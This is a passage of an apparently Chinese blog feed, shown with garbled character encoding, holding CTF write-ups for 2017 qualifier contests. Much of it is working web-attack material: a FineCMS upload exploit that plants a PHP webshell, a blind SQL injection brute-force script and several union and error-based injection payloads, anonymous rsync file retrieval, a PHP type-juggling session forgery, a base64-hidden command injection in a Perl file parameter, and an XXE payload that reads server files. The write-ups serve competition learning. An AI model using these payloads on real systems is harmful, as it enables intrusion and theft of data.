<h2 id="ç»¼åˆæ¸—é€"><a href="#ç»¼åˆæ¸—é€" class="headerlink" title="ç»¼åˆæ¸—é€"></a>ç»¼åˆæ¸—é€</h2><p>é¢˜ç›®æç¤ºè®©æˆ‘ä»¬å¤ç°expï¼Œè¯¥ç«™ç”¨çš„æ˜¯<code>finecms</code></p>
<p>ç™¾åº¦å¾—åˆ°æ­¤cmsçš„ä¸€ä¸ªä¸Šä¼ æ¼æ´ï¼Œæ„é€ htmlæ–‡ä»¶å¦‚ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ª<code>phtml</code>åç¼€çš„ä¸€å¥è¯ä¸Šå»ï¼Œèœåˆ€è¿æ¥åœ¨<code>/flag</code>å¾—åˆ°flagï¼Œ<code>flag{o1d_bug_t0_send_point!}</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">â€utf-8â€³</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Finecms ajaxswfupload exp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">â€http://114.55.88.132:20580/index.php?c</span>=<span class="string">attachment&amp;a</span>=<span class="string">ajaxswfuploadâ€</span> <span class="attr">method</span>=<span class="string">â€POSTâ€</span> <span class="attr">enctype</span>=<span class="string">â€multipart/form-dataâ€</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€fileâ€</span> <span class="attr">name</span>=<span class="string">â€Filedataâ€</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€hiddenâ€</span> <span class="attr">name</span>=<span class="string">â€typeâ€</span> <span class="attr">value</span>=<span class="string">â€phtmlâ€</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€hiddenâ€</span> <span class="attr">name</span>=<span class="string">â€sizeâ€</span> <span class="attr">value</span>=<span class="string">â€100â€³</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€submitâ€</span> <span class="attr">name</span>=<span class="string">â€submitâ€</span> <span class="attr">value</span>=<span class="string">â€ä¸Šä¼ æ–‡ä»¶â€</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>è¿™é“é¢˜åˆ°æœ€åä¹Ÿæ²¡åšå‡ºæ¥ï¼ŒæŠ¥é”™æ³¨å…¥æ³¨ï¼Œè¿‡æ»¤äº†<code>union</code>å’Œ<code>column_name</code>è¿˜æœ‰<code>*</code>ï¼Œä¸çŸ¥é“å­—æ®µåæ˜¯å•¥</p>
<p>å‚è€ƒäº†<a href="http://www.wupco.cn/?p=3764" target="_blank" rel="noopener">http://www.wupco.cn/?p=3764</a><br>ä»è¯¥æ–‡ç« ä¸­å¯ä»¥å¾—çŸ¥è¿™é“æ³¨å…¥é¢˜çš„æ ¸å¿ƒä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"desc `error_&#123;$table&#125;`"</span>;</div><div class="line">$res = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(mysql_fetch_array($res)))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;no table detail&lt;/center&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sql = <span class="string">"select * from error_$&#123;table&#125; where id = $id"</span>;</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹å‡ºé€šè¿‡<code>desc</code>è¯­å¥åˆ¤æ–­tableæ˜¯å¦å­˜åœ¨ï¼Œå†æ‰§è¡Œä¸‹ä¸€ä¸ªsqlè¯­å¥<br>DESCçš„è¯­æ³•å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DESC tbl_name [col_name | wild]</div></pre></td></tr></table></figure></p>
<p>æ„é€ payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=flag` `a%&amp;id=3</div></pre></td></tr></table></figure></p>
<p>pythonè„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line">r1=r.session()</div><div class="line">s=<span class="string">"abcdefghijklmnopqrstuvwxyz1234567890_"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">  url=<span class="string">"http://114.55.36.69:20680/index.php?table=flag` `&#123;0&#125;%&amp;id=3"</span></div><div class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> s:</div><div class="line">    url2=url.format(str(flag+j))</div><div class="line">    r2=r1.get(url2)</div><div class="line">    <span class="keyword">if</span> <span class="string">"SQL"</span> <span class="keyword">in</span> r2.text:</div><div class="line">      flag+=j</div><div class="line">      <span class="keyword">print</span> flag</div><div class="line">      <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>å¾—åˆ°<code>error_flag</code>è¡¨çš„å­—æ®µåä¸º<code>flag_you_will_never_know</code><br>å†ä½¿ç”¨æŠ¥é”™æ³¨å…¥æŸ¥è¯¢å³å¯æ‹¿åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news&amp;id=3 -updatexml(1,concat(&apos;a=.&apos;,(select flag_you_will_never_know from error_flag)),1)#</div></pre></td></tr></table></figure></p>
<h2 id="æœåŠ¡å‘ç°"><a href="#æœåŠ¡å‘ç°" class="headerlink" title="æœåŠ¡å‘ç°"></a>æœåŠ¡å‘ç°</h2><p>nmapæ‰«æåå‘ç°<code>rsync</code>å¼€æ”¾<br>rsyncç©ºå£ä»¤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync 118.178.18.181::</span></div><div class="line"><span class="built_in">source</span> code   </div><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync 118.178.18.181::source\ code/</span></div><div class="line">drwxr-xr-x        4096 2017/06/14 13:01:20 .</div><div class="line">-rw-r--r--          44 2017/06/14 13:01:20 flag.php</div><div class="line">-rw-r--r--          26 2017/06/14 13:01:20 index.php</div><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync -azv 118.178.18.181::source\ code/flag.php ~/flag.txt</span></div><div class="line">receiving incremental file list</div><div class="line"></div><div class="line">sent 19 bytes  received 41 bytes  120.00 bytes/sec</div><div class="line">total size is 44  speedup is 0.73</div><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># cat flag.txt</span></div><div class="line">&lt;?php</div><div class="line"><span class="variable">$flag</span> = <span class="string">"flag&#123;rsync_i5_very_useful!&#125;"</span>;</div></pre></td></tr></table></figure></p>
<h2 id="findpwd"><a href="#findpwd" class="headerlink" title="findpwd"></a>findpwd</h2><p>é¢˜ç›®æç¤ºäº†å¼€å‘è€…ç”¨çš„ideæ˜¯netbeanï¼ŒæŸ¥çœ‹ideå·¥ä½œç©ºé—´çš„æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:20880/nbproject/private/private.xml</div></pre></td></tr></table></figure></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">project-private</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/project-private/1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">editor-bookmarks</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/editor-bookmarks/2"</span> <span class="attr">lastBookmarkId</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">open-files</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/projectui-open-files/2"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>file:/var/www/html/fuckbean/index.php<span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span></div><div class="line">file:/var/www/html/fuckbean/f1ndmyp4ssw0rdnineverno.php</div><div class="line"><span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>file:/var/www/html/fuckbean/1.sql<span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">open-files</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">project-private</span>&gt;</span></div></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>1.sql</code>å’Œ<code>f1ndmyp4ssw0rdnineverno.php</code>ä¸¤ä¸ªæ–‡ä»¶<br>f1ndmyp4ssw0rdnineverno.phpæ˜¯ä¸ªè¾“å…¥é‚®ç®±æ‰¾å›å¯†ç çš„é¡µé¢<br>ä¸‹è½½<code>1.sql</code>ï¼Œè¿™é‡Œå°±å¯ä»¥çŒœæµ‹å¯èƒ½æ˜¯æ³¨å…¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> fuckbean;</div><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> fuckbean;</div><div class="line"><span class="keyword">use</span> fuckbean;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</div><div class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">5</span>),</div><div class="line">username <span class="built_in">varchar</span>(<span class="number">20</span>),</div><div class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</div><div class="line">mail    <span class="built_in">varchar</span>(<span class="number">50</span>)</div><div class="line">);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"admin"</span>,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>,<span class="string">"admin@admin.com"</span>);</div><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> fuckbean.* <span class="keyword">to</span> fuckbean@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'fuckbean'</span>;</div></pre></td></tr></table></figure></p>
<p>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a&apos;union select 1,2,3,0xxxxxxx-- a@qq.com</div></pre></td></tr></table></figure></p>
<p>å…¶ä¸­<code>0xxxxxxx</code>æ˜¯ä½ è‡ªå·±çš„é‚®ç®±çš„hexï¼Œæäº¤åæ”¶åˆ°flagé‚®ä»¶</p>
<h2 id="babylogin"><a href="#babylogin" class="headerlink" title="babylogin"></a>babylogin</h2><p>é¢˜ç›®ç»™äº†æºä»£ç ï¼Œå…³é”®è¯­å¥å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key) &#123;</div><div class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $key2 =&gt; $value) &#123;</div><div class="line">        $_GPC[$key2]=$value;</div><div class="line">    &#125;</div><div class="line">...</div><div class="line">...</div><div class="line"></div><div class="line">$session = json_decode(base64_decode($_GPC[<span class="string">'__session'</span>]), <span class="keyword">true</span>);</div><div class="line">    <span class="keyword">if</span> (is_array($session))&#123;</div><div class="line">        $user = find_user_by_uid($session[<span class="string">'uid'</span>]);</div><div class="line">        <span class="keyword">if</span>(is_array($user) &amp;&amp; $session[<span class="string">'hash'</span>] == $user[<span class="string">'password'</span>])&#123;</div><div class="line">            $_SESSION[<span class="string">"login"</span>]=<span class="number">1</span>;</div><div class="line">            $_SESSION[<span class="string">"userin"</span>]=$userin;</div><div class="line">            header(<span class="string">"Location: admin.php"</span>);</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹å‡º<code>session</code>å¯æ§ï¼Œè€Œä¸”å­˜åœ¨<code>==</code>å¼±ç±»å‹,<code>True==&quot;xxxxxxx&quot;</code> æ’æˆç«‹<br>ç”¨å¦‚ä¸‹ä»£ç æ„é€ payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$session[<span class="string">'uid'</span>]=<span class="number">1</span>;</div><div class="line">$session[<span class="string">'hash'</span>]=<span class="keyword">True</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(json_encode($session));</div></pre></td></tr></table></figure></p>
<p>æœ€åæŠ“ç™»é™†çš„åŒ…ï¼ŒåŠ ä¸€ä¸ªå‚æ•°<code>__session</code>å€¼ä¸º<code>eyJ1aWQiOjEsImhhc2giOnRydWV9</code>å°±èƒ½è·³è½¬åˆ°<code>admin.php</code></p>
<h2 id="phpçš„é”…"><a href="#phpçš„é”…" class="headerlink" title="phpçš„é”…"></a>phpçš„é”…</h2><p>æ”¹å¤©å†™å¥½äº†</p>
<h1 id="ç§‹å­£é¢„èµ›"><a href="#ç§‹å­£é¢„èµ›" class="headerlink" title="ç§‹å­£é¢„èµ›"></a>ç§‹å­£é¢„èµ›</h1><h2 id="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€"><a href="#éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€" class="headerlink" title="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€"></a>éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57016/index.pl?file=test.txt" target="_blank" rel="noopener">http://118.178.18.181:57016/index.pl?file=test.txt</a><br>perlå†™çš„ï¼Œç›´æ¥è¯»å–<code>index.pl</code>å°±èƒ½æ‹¿åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:57016/index.pl?file=index.pl</div></pre></td></tr></table></figure></p>
<h2 id="æŸ¥è¯¢ip"><a href="#æŸ¥è¯¢ip" class="headerlink" title="æŸ¥è¯¢ip"></a>æŸ¥è¯¢ip</h2><p>å¤å­£é¢„èµ›çš„é¢˜ï¼Œç›´æ¥nslookup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">C:\Users\xxxxxx&gt;nslookup 107.182.177.34</div><div class="line">æœåŠ¡å™¨:  UnKnown</div><div class="line">Address:  172.16.0.1</div><div class="line"></div><div class="line">åç§°:    this-is-flag</div><div class="line">Address:  107.182.177.34</div></pre></td></tr></table></figure></p>
<h2 id="macå°±æ˜¯å¥½ç”¨"><a href="#macå°±æ˜¯å¥½ç”¨" class="headerlink" title="macå°±æ˜¯å¥½ç”¨"></a>macå°±æ˜¯å¥½ç”¨</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57013/" target="_blank" rel="noopener">http://118.178.18.181:57013/</a><br>ä¸‹è½½<code>http://118.178.18.181:57013/.DS_store</code>,catä¸€ä¸‹ï¼Œå‘ç°<code>s h o w m e f l a g . p h p</code>å­—æ ·<br>è®¿é—®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:57013/showmeflag.php</div></pre></td></tr></table></figure></p>
<p>æ‹¿åˆ°flag</p>
<h2 id="äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´"><a href="#äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´" class="headerlink" title="äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´"></a>äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://114.55.36.69:57012/" target="_blank" rel="noopener">http://114.55.36.69:57012/</a><br>ç»å…¸ç™»å½•æ¡†æ³¨å…¥ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=1&apos;union select md5(1)#</div><div class="line">password=1</div></pre></td></tr></table></figure></p>
<p>æ‹¿åˆ°flag</p>
<h2 id="sqlmapæ²¡æœ‰åµç”¨"><a href="#sqlmapæ²¡æœ‰åµç”¨" class="headerlink" title="sqlmapæ²¡æœ‰åµç”¨"></a>sqlmapæ²¡æœ‰åµç”¨</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57019/" target="_blank" rel="noopener">http://118.178.18.181:57019/</a><br>å³é”®æºä»£ç æç¤º<code>source.php</code>,unionå’Œfromå‰é¢åªèƒ½å­˜åœ¨å­—æ¯ï¼Œä¸èƒ½æœ‰ç©ºæ ¼ï¼Œæ„é€ <code>\N</code>ç»•è¿‡ï¼Œ(æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥åªæœ‰<code>\N</code>å¯ä»¥ï¼Œå°å†™nçš„ä¸è¡Œ)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">\Nunion <span class="keyword">select</span> <span class="number">1</span>,flag, \Nfrom flag%<span class="number">23</span> </div><div class="line"> // \Nè¡¨ç¤ºå›è½¦ï¼Œåœ¨Linuxä¸­è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸã€‚</div></pre></td></tr></table></figure></p>
<h2 id="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€-1"><a href="#éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€-1" class="headerlink" title="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€"></a>éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57016/index.pl?file=test.txt" target="_blank" rel="noopener">http://118.178.18.181:57016/index.pl?file=test.txt</a><br>æ„é€ ä»£ç æ³¨å…¥ï¼Œè¿™é‡Œè¦æŠŠå«æœ‰flagçš„ç”¨base64ç¼–ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:57016/index.pl?file=test.txt| `echo Y2F0IC92YXIvd3d3L2h0bWwvZmxhZy5wbA==| base64 -d`|</div></pre></td></tr></table></figure></p>
<h2 id="can-u-read-me-do-u-understand-me"><a href="#can-u-read-me-do-u-understand-me" class="headerlink" title="can u read me,do u understand me?"></a>can u read me,do u understand me?</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://114.55.36.69:57018/" target="_blank" rel="noopener">http://114.55.36.69:57018/</a><br>XXE,ç›´æ¥è¯»å–flag.phpï¼Œè¯»å–å‡ºæ¥çš„æºç æ˜¯phpjiamiè¿‡çš„ï¼Œå¯ä»¥å»èŠ±é’±è§£ä¹Ÿå¯ä»¥ç›´æ¥ç”¨å·¥å…·è§£<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE xdsec[</div><div class="line">&lt;!ELEMENT methodname ANY&gt;</div><div class="line">&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;</div><div class="line">&lt;user&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/user&gt;</div></pre></td></tr></table></figure></p>
<h2 id="è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›"><a href="#è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›" class="headerlink" title="è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›"></a>è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://114.55.36.69:57014/" target="_blank" rel="noopener">http://114.55.36.69:57014/</a><br>ç»™äº†æºç <br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;union select 1,2,3,4 -- yourqq@qq.com</div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨äº†ç©ºæ ¼ä¼šè¢«åˆ†å‰²æˆå¤šä¸ªæ”¶ä»¶äºº</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…¶å®å°±æ˜¯æ…•æµ‹å®‰æ’æ¯&lt;br&gt;6æœˆ18æ—¥çš„å¤å­£é¢„èµ›çº¿ä¸Šèµ›ï¼Œ9æœˆ22æ—¥æ›´æ–°babysqlï¼Œ10æœˆ12æ—¥æ›´æ–°findpwdã€æœåŠ¡å‘ç°ã€babylogin&lt;br&gt;10æœˆ23æ›´æ–°ç§‹å­£é¢„èµ›é¢˜ç›®&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="æ–‡ä»¶åŒ…å«" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="ç¼–è¾‘å™¨æ³„éœ²" scheme="https://www.codemonster.cn/tags/%E7%BC%96%E8%BE%91%E5%99%A8%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>2017 ä¸–å®‰æ¯çº¿ä¸Šé¢„èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/10/2017-shianbei-ctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/10/2017-shianbei-ctf-writeup/</id>
    <published>2017-10-10T06:41:39.000Z</published>
    <updated>2018-05-04T07:47:50.013Z</updated>
    
    <content type="html"><![CDATA[<p>emmmmmmmmï¼Œå…³äºæ¯”èµ›è´¨é‡é—®é¢˜ï¼Œå‡ºé—¨å·¦è½¬<a href="https://www.zhihu.com/question/66360616" target="_blank" rel="noopener">çŸ¥ä¹</a>ï¼Œå‡ºé—¨å³è½¬<a href="https://ctfrank.org/events/39" target="_blank" rel="noopener">ctfrank</a><br>æ˜¨å¤©ç«Ÿç„¶æ¥åˆ°äº†å†³èµ›é€šçŸ¥ç”µè¯ï¼Œè€ƒè™‘åˆ°å„ç§é—®é¢˜ï¼Œæœ€åè¿˜æ˜¯å¼ƒæƒäº†<br>ä»¥ä¸‹æ˜¯çº¿ä¸Šèµ›wp<br><a id="more"></a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ctfå…¥é—¨çº§é¢˜ç›®"><a href="#ctfå…¥é—¨çº§é¢˜ç›®" class="headerlink" title="ctfå…¥é—¨çº§é¢˜ç›®"></a>ctfå…¥é—¨çº§é¢˜ç›®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-rao/</div></pre></td></tr></table></figure>
<p>é¢˜ç›®ç»™äº†æºä»£ç <code>index.phps</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'*********'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;section class="login"&gt;</div><div class="line">        &lt;div class="title"&gt;</div><div class="line">                &lt;a href=<span class="string">"./index.phps"</span>&gt;View Source&lt;/a&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">        &lt;form method=<span class="string">"POST"</span>&gt;</div><div class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> /&gt;&lt;br/&gt;</div><div class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;/section&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
